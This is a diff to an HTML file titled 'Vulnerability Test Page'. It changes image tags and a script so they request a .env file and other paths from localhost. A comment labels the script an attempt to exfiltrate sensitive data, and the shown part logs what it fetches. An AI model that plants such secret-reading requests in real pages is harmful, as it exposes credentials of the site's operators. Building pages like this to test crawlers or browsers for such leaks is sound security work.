@@ -9,13 +9,13 @@
     <h1>Vulnerability Test Page</h1>
 
     <!-- Image pointing to a potential internal file -->
-    <img src="http://127.0.0.1:1234/.env" alt="Test Image">
-    <img src="/admin.py" alt="Test Image">
-    <img src="/app/admin.py" alt="Test Image">
+    <img src="http://127.0.0.1/.env" alt="Test Image">
+    <img src="http://127.0.0.1/" alt="Test Image">
+    <img src="http://127.0.0.1/" alt="Test Image">
     
     <!-- JavaScript to attempt exfiltration of sensitive data -->
     <script>
-        fetch("/app/.env")
+        fetch("http://127.0.0.1/.env")
             .then(response => response.text())
             .then(data => {
                 console.log("Data fetched:", data);
